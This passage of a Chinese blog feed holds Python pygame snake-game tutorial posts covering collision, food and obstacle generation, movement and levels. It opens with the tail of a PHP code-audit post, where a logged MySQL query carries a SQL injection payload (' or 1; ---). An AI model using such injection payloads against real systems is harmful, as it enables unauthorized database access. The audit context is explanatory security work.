from tgyd_users where sid =&apos;1&apos; or 1; ---&apos; limit 1</span><br><span class="line">   16 Quit</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> PHP </tag>
            
            <tag> Code Audit </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>10 贪吃蛇 - 游戏关卡</title>
      <link href="/2018/07/14/snake-level/"/>
      <url>/2018/07/14/snake-level/</url>
      <content type="html"><![CDATA[<p>贪吃蛇现在可以说是可以移动，可以生成地图、可以生成食物，现在我们来做一个检测，当蛇吃到的食物时则刷新地图和调整蛇速度</p><a id="more"></a><h2 id="基础移动以及身体加长"><a href="#基础移动以及身体加长" class="headerlink" title="基础移动以及身体加长"></a>基础移动以及身体加长</h2><p>首先做移动检测，当蛇头和食物碰撞时，则判断食物被吃且身体添加一格，先是碰撞检测部分</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 判断是否吃到食物</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">has_eat</span><span class="params">(self, food)</span>:</span></span><br><span class="line">    <span class="comment"># 头部与食物相碰撞</span></span><br><span class="line">    <span class="keyword">return</span> self._block_is_hit(self.body[<span class="number">0</span>], food)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断坐标是否相等</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_block_is_hit</span><span class="params">(self, pos1, pos2)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> pos1[<span class="number">0</span>] == pos2[<span class="number">0</span>] <span class="keyword">and</span> pos1[<span class="number">1</span>] == pos2[<span class="number">1</span>]</span><br></pre></td></tr></table></figure><p>然后对蛇身部分进行一次判断</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> self._plus:</span><br><span class="line">    <span class="comment"># 剔除最末尾</span></span><br><span class="line">    self.body.pop(len(self.body) - <span class="number">1</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    self._plus = <span class="keyword">False</span></span><br></pre></td></tr></table></figure><p>最后将移动与界面联合起来，吃到食物后将随机生成食物位置：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 蛇移动事件处理</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_move</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> self.snake.has_eat(self._food):</span><br><span class="line">        self.snake.plus()</span><br><span class="line">        self._food = self._get_random_block()</span><br></pre></td></tr></table></figure><p>现在，吃到食物能够加长身体了，需要判断蛇头是否撞墙以及撞到身体：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 判断是否撞到物品</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">has_hit</span><span class="params">(self, blocks)</span>:</span></span><br><span class="line">    bodys = copy.deepcopy(self.body)</span><br><span class="line">    head = bodys.pop(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> block <span class="keyword">in</span> bodys:</span><br><span class="line">        <span class="keyword">if</span> self._block_is_hit(head, block):</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">for</span> block <span class="keyword">in</span> blocks:</span><br><span class="line">        <span class="keyword">if</span> self._block_is_hit(head, block):</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">False</span></span><br></pre></td></tr></table></figure><p>如果撞到了则切换到游戏结束页面：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 蛇移动事件处理</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_move</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> self.snake.has_eat(self._food):</span><br><span class="line">        self.snake.plus()</span><br><span class="line">        self._food = self._get_random_block()</span><br><span class="line">    <span class="comment"># 如果碰撞，切换到游戏结束页面</span></span><br><span class="line">    <span class="keyword">if</span> self.snake.has_hit(self._block):</span><br><span class="line">        self.context.view = GameOverView(self.context)</span><br></pre></td></tr></table></figure><p>现在编写游戏结束界面</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GameOverView</span><span class="params">(View)</span>:</span></span><br><span class="line">    btn_replay = <span class="keyword">None</span></span><br><span class="line">    btn_exit = <span class="keyword">None</span></span><br><span class="line">    context = <span class="keyword">None</span></span><br><span class="line">    game_over = <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, context)</span>:</span></span><br><span class="line">        self.btn_replay = Button(<span class="string">'Replay Game'</span>, self._on_start)</span><br><span class="line">        self.btn_exit = Button(<span class="string">'Exit Game'</span>, self._on_exit)</span><br><span class="line">        font = pygame.font.SysFont(<span class="string">'arial'</span>, <span class="number">32</span>)</span><br><span class="line">        self.game_over = font.render(<span class="string">'Game Over'</span>, <span class="keyword">True</span>, (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">        self.context = context</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">on_draw</span><span class="params">(self)</span>:</span></span><br><span class="line"></span><br><span class="line">        s_w, s_h=self.context.screen.get_size()</span><br><span class="line">        l_w, l_h=self.game_over.get_size()</span><br><span class="line">        x, y, bs_w, bs_h=self.btn_replay.get_box()</span><br><span class="line">        x, y, be_w, be_h=self.btn_exit.get_box()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 所有元素高度</span></span><br><span class="line">        y_h = bs_h + be_h + l_h + <span class="number">4</span> + <span class="number">50</span></span><br><span class="line"></span><br><span class="line">        y_start=s_h/<span class="number">2</span>-y_h/<span class="number">2</span> + <span class="number">50</span></span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        界面元素排版</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        self.btn_replay.pos=(s_w/<span class="number">2</span> - bs_w / <span class="number">2</span>, y_start)</span><br><span class="line">        self.btn_exit.pos=(s_w/<span class="number">2</span> - be_w / <span class="number">2</span>, y_start + bs_h + <span class="number">4</span>)</span><br><span class="line">        self.context.screen.blit(self.game_over, (s_w/<span class="number">2</span>-l_w/<span class="number">2</span>, s_h/<span class="number">2</span>-y_h/<span class="number">2</span>))</span><br><span class="line">        <span class="comment"># 绘制按钮</span></span><br><span class="line">        self.btn_replay.on_draw(self.context.screen)</span><br><span class="line">        self.btn_exit.on_draw(self.context.screen)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_on_exit</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># 控制退出状态</span></span><br><span class="line">        print(<span class="string">'exit game'</span>)</span><br><span class="line">        self.context.running=<span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_on_start</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># 切换界面到游戏界面</span></span><br><span class="line">        print(<span class="string">'start game'</span>)</span><br><span class="line">        self.context.view=GameView(self.context)</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">on_event</span><span class="params">(self, event)</span>:</span></span><br><span class="line">        <span class="comment"># 监控各种事件</span></span><br><span class="line">        self.btn_replay.on_event(event)</span><br><span class="line">        self.btn_exit.on_event(event)</span><br></pre></td></tr></table></figure><p>界面：</p><p><img src="0.png" alt=""></p><h2 id="游戏关卡级别"><a href="#游戏关卡级别" class="headerlink" title="游戏关卡级别"></a>游戏关卡级别</h2><p>当吃到食物后，计算吃到的次数，如果吃到的次数和关卡一致，则速度增加</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_move</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> self.snake.has_eat(self._food):</span><br><span class="line">        self.snake.plus()</span><br><span class="line">        self._food = self._get_random_block()</span><br><span class="line">        <span class="comment"># 积分加一</span></span><br><span class="line">        self.score = self.score + self.level</span><br><span class="line">        <span class="comment"># 等级调整</span></span><br><span class="line">        self.eat_count = self.eat_count + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> self.eat_count &gt;= self.level:</span><br><span class="line">            <span class="comment"># 游戏难度+1</span></span><br><span class="line">            self.level = self.level + <span class="number">1</span></span><br><span class="line">            <span class="comment"># 移动速度+1</span></span><br><span class="line">            self.snake.speed = self.snake.speed - <span class="number">1</span></span><br><span class="line">            <span class="comment"># 食物计算归零</span></span><br><span class="line">            self.eat_count = <span class="number">0</span></span><br><span class="line">            <span class="comment"># 重新生成地图</span></span><br><span class="line">            self._block = [self._get_random_block() <span class="keyword">for</span> i <span class="keyword">in</span> range(random.randrange(<span class="number">3</span>, <span class="number">6</span>))]</span><br></pre></td></tr></table></figure><p>显示积分：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">text = self.font.render(<span class="string">'level:%d score: %s'</span> % (</span><br><span class="line">    self.level, self.score), <span class="keyword">True</span>, (<span class="number">0xff</span>, <span class="number">0</span>, <span class="number">0xff</span>))</span><br><span class="line">self.context.screen.blit(</span><br><span class="line">    text, (self.context.screen.get_size()[<span class="number">0</span>] - text.get_size()[<span class="number">0</span>] - <span class="number">2</span>, <span class="number">0</span>))</span><br></pre></td></tr></table></figure><p>运行界面：</p><p><img src="1.png" alt=""></p><p>程序代码：<a href="https://github.com/DXkite/python-snake-game-demo/tree/master/10-snake-level" target="_blank" rel="noopener">https://github.com/DXkite/python-snake-game-demo/tree/master/10-snake-level</a></p>]]></content>
      
      <categories>
          
          <category> 基础教程 </category>
          
          <category> Python贪吃蛇教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> pygame </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>09 贪吃蛇 - 食物与障碍物生成</title>
      <link href="/2018/07/13/snake-food-and-block/"/>
      <url>/2018/07/13/snake-food-and-block/</url>
      <content type="html"><![CDATA[<p>前面我们完成了贪吃蛇的绘制和移动，本节将随机生成砖块和食物<br><a id="more"></a></p><p>生成砖块和食物的规则很简单：</p><ol><li>不能在已经有食物的地方生成任何块</li><li>已经生成砖块和食物的地方不能生成</li><li>不能生成在蛇身上</li></ol><p>根据这个规则，我们在游戏视图中写入这些规则，随机生成食物和砖块，如果方块产生了重叠则递归再次生成</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 随机生成地图坐标</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_random</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (random.randrange(<span class="number">0</span>, self.w), random.randrange(<span class="number">0</span>, self.h))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 随机生成无冲突坐标</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_get_random_block</span><span class="params">(self)</span>:</span></span><br><span class="line">    block = self._random()</span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> self.snake.body:</span><br><span class="line">        <span class="keyword">if</span> pos[<span class="number">0</span>] == block[<span class="number">0</span>] <span class="keyword">and</span> pos[<span class="number">1</span>] == block[<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">return</span> self._get_random_block()</span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> self._block:</span><br><span class="line">        <span class="keyword">if</span> pos[<span class="number">0</span>] == block[<span class="number">0</span>] <span class="keyword">and</span> pos[<span class="number">1</span>] == block[<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">return</span> self._get_random_block()</span><br><span class="line">    <span class="keyword">if</span> block[<span class="number">0</span>] == self._food[<span class="number">0</span>] <span class="keyword">and</span> block[<span class="number">1</span>] == self._food[<span class="number">1</span>]:</span><br><span class="line">        <span class="keyword">return</span> self._get_random_block()</span><br><span class="line">    <span class="keyword">return</span> block</span><br></pre></td></tr></table></figure><p>生成砖块和食物后，我们将他绘制到地图上</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_draw</span><span class="params">(self)</span>:</span></span><br><span class="line">    self.snake.on_draw(self)</span><br><span class="line">    self.draw_surface(self._food, self.food)</span><br><span class="line">    <span class="keyword">for</span> block <span class="keyword">in</span> self._block:</span><br><span class="line">        self.draw_surface(block, self.block)</span><br></pre></td></tr></table></figure><p>运行后代码：<a href="https://github.com/DXkite/python-snake-game-demo/tree/master/09-snake-food-and-block" target="_blank" rel="noopener">https://github.com/DXkite/python-snake-game-demo/tree/master/09-snake-food-and-block</a></p><p><img src="0.png" alt=""></p>]]></content>
      
      <categories>
          
          <category> 基础教程 </category>
          
          <category> Python贪吃蛇教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> pygame </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>08 贪吃蛇 - 绘制与移动蛇</title>
      <link href="/2018/07/12/snake-draw-and-move/"/>
      <url>/2018/07/12/snake-draw-and-move/</url>
      <content type="html"><![CDATA[<p>主界面做好以后，我们开始做贪吃蛇界面，首先定义好一个贪吃蛇游戏界面的类，创建好地图大小，我们这里创建一个 12*12的地图块</p><a id="more"></a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GameView</span><span class="params">(View)</span>:</span></span><br><span class="line">    block = <span class="keyword">None</span></span><br><span class="line">    food = <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, context)</span>:</span></span><br><span class="line">        View.__init__(self, context.screen)</span><br><span class="line">        <span class="comment"># 加载基础资源</span></span><br><span class="line">        self.block = pygame.image.load(<span class="string">'img/block.jpg'</span>)</span><br><span class="line">        self.food = pygame.image.load(<span class="string">'img/food.png'</span>)</span><br><span class="line">        <span class="comment"># 获取地图块大小</span></span><br><span class="line">        self.BLOCK_SIZE = self.block.get_size()</span><br><span class="line">        <span class="comment"># 设置屏幕大小</span></span><br><span class="line">        context.screen = pygame.display.set_mode(</span><br><span class="line">            (<span class="number">12</span>*self.BLOCK_SIZE[<span class="number">0</span>], <span class="number">12</span> * self.BLOCK_SIZE[<span class="number">1</span>]), <span class="number">0</span>, <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">"""</span></span><br><span class="line"><span class="string">    在某个位置绘制一个块</span></span><br><span class="line"><span class="string">    """</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">draw_surface</span><span class="params">(self, pos, surface)</span>:</span></span><br><span class="line">        self.screen.blit(</span><br><span class="line">            surface, (pos[<span class="number">0</span>]*self.BLOCK_SIZE[<span class="number">0</span>], pos[<span class="number">1</span>]*self.BLOCK_SIZE[<span class="number">1</span>]))</span><br></pre></td></tr></table></figure><p>创建完成后，我们来实现一个贪吃蛇类，控制贪吃蛇的移动与绘制，首先我们生成一个数组存储贪吃蛇并对其进行一系列的处理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Snake</span>:</span></span><br><span class="line">    <span class="comment"># 方向说明</span></span><br><span class="line">    HEAD_UP = <span class="number">0</span></span><br><span class="line">    HEAD_DOWN = <span class="number">1</span></span><br><span class="line">    HEAD_LEFT = <span class="number">2</span></span><br><span class="line">    HEAD_RIGHT = <span class="number">3</span></span><br><span class="line">    <span class="comment"># 移动方向</span></span><br><span class="line">    direction = HEAD_LEFT</span><br><span class="line">    <span class="comment"># 身体数据</span></span><br><span class="line">    body = []</span><br><span class="line">    <span class="comment"># 初始化</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, x, y)</span>:</span></span><br><span class="line">        self.body = [[x, y], [x - <span class="number">1</span>, y], [x<span class="number">-2</span>, y]]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 监听按键</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">on_event</span><span class="params">(self, event)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 绘制贪吃蛇</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">on_draw</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 判断是否吃到食物</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">has_eat</span><span class="params">(self, food)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 判断是否撞到物品</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">has_hit</span><span class="params">(self, blocks)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>初始化的时候，我们在地图上创建了个 12*12 的地图，蛇从地图的任意地方生成蛇头，我们将蛇身初始为3格,初始向右爬行，则初始化身体：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, x, y)</span>:</span></span><br><span class="line">    self.body = [[x, y], [x - <span class="number">1</span>, y], [x<span class="number">-2</span>, y]]</span><br></pre></td></tr></table></figure><p>在初始化的时候我们需要将资源也加载上来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, x, y)</span>:</span></span><br><span class="line">    self.body = [[x, y], [x - <span class="number">1</span>, y], [x<span class="number">-2</span>, y]]</span><br><span class="line">    self.direction = self.HEAD_RIGHT</span><br><span class="line">    self.img_head = [pygame.image.load(</span><br><span class="line">        <span class="string">'img/head_'</span> + str(i+<span class="number">1</span>) + <span class="string">'.png'</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>)]</span><br><span class="line">    self.img_body = pygame.image.load(<span class="string">'img/body.png'</span>)</span><br></pre></td></tr></table></figure><p>现在我们监控按键，对于蛇，按下后会改变方向，且只能向正向改变方向（如：当蛇向上移动时不能一下向下移动）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_event</span><span class="params">(self, event)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> event.key == K_UP <span class="keyword">and</span> self.direction != self.HEAD_DOWN:</span><br><span class="line">        self.direction = self.HEAD_UP</span><br><span class="line">    <span class="keyword">elif</span> event.key == K_DOWN <span class="keyword">and</span> self.direction != self.HEAD_UP:</span><br><span class="line">        self.direction = self.HEAD_DOWN</span><br><span class="line">    <span class="keyword">elif</span> event.key == K_LEFT <span class="keyword">and</span> self.direction != self.HEAD_RIGHT:</span><br><span class="line">        self.direction = self.HEAD_LEFT</span><br><span class="line">    <span class="keyword">elif</span> event.key == K_RIGHT <span class="keyword">and</span> self.direction != self.HEAD_LEFT:</span><br><span class="line">        self.direction = self.HEAD_RIGHT</span><br></pre></td></tr></table></figure><p>现在我们需要绘制蛇身，遍历身体的每一个位置，每次刷新绘图的时候都会调用 <code>on_draw</code> 我们通过监控 <code>on_draw</code> 调用的次数来计算速度，当蛇爬到边界时从对侧出现，实现代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 绘制贪吃蛇</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_draw</span><span class="params">(self, view)</span>:</span></span><br><span class="line">    <span class="comment"># 绘制已有的身体</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(self.body)):</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            view.draw_surface(self.body[i], self.img_head[self.direction])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            view.draw_surface(self.body[i], self.img_body)</span><br><span class="line">    <span class="comment"># 计算移动</span></span><br><span class="line">    <span class="keyword">if</span> self.frame_count &lt; self.speed:</span><br><span class="line">        self.frame_count = self.frame_count + <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        self.frame_count = <span class="number">0</span></span><br><span class="line">        <span class="comment"># 调整头部方向</span></span><br><span class="line">        move = copy.deepcopy(self.body[<span class="number">0</span>])</span><br><span class="line">        <span class="comment"># 计算移动</span></span><br><span class="line">        <span class="keyword">if</span> self.direction == self.HEAD_UP:</span><br><span class="line">            move[<span class="number">1</span>] = move[<span class="number">1</span>] - <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> move[<span class="number">1</span>] &lt; <span class="number">0</span>:</span><br><span class="line">                move[<span class="number">1</span>] = view.h - <span class="number">1</span></span><br><span class="line">            self.body.insert(<span class="number">0</span>, move)</span><br><span class="line">        <span class="keyword">elif</span> self.direction == self.HEAD_DOWN:</span><br><span class="line">            move[<span class="number">1</span>] = move[<span class="number">1</span>] + <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> move[<span class="number">1</span>] &gt;= view.h:</span><br><span class="line">                move[<span class="number">1</span>] = <span class="number">0</span></span><br><span class="line">            self.body.insert(<span class="number">0</span>, move)</span><br><span class="line">        <span class="keyword">elif</span> self.direction == self.HEAD_LEFT:</span><br><span class="line">            move[<span class="number">0</span>] = move[<span class="number">0</span>] - <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> move[<span class="number">0</span>] &lt; <span class="number">0</span>:</span><br><span class="line">                move[<span class="number">0</span>] = view.w - <span class="number">1</span></span><br><span class="line">            self.body.insert(<span class="number">0</span>, move)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            move[<span class="number">0</span>] = move[<span class="number">0</span>] + <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> move[<span class="number">0</span>] &gt;= view.w:</span><br><span class="line">                move[<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line">            self.body.insert(<span class="number">0</span>, move)</span><br><span class="line">        <span class="comment"># 剔除最末尾</span></span><br><span class="line">        self.body.pop(len(self.body) - <span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>现在我们将蛇加入地图 GameView：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GameView</span><span class="params">(View)</span>:</span></span><br><span class="line">    block = <span class="keyword">None</span></span><br><span class="line">    food = <span class="keyword">None</span></span><br><span class="line">    snake = <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, context)</span>:</span></span><br><span class="line">        View.__init__(self, context.screen)</span><br><span class="line">        <span class="comment"># 加载基础资源</span></span><br><span class="line">        self.block = pygame.image.load(<span class="string">'img/block.jpg'</span>)</span><br><span class="line">        self.food = pygame.image.load(<span class="string">'img/food.png'</span>)</span><br><span class="line">        self.w = <span class="number">12</span></span><br><span class="line">        self.h = <span class="number">12</span></span><br><span class="line">        self.BLOCK_SIZE = self.block.get_size()</span><br><span class="line">        context.screen = 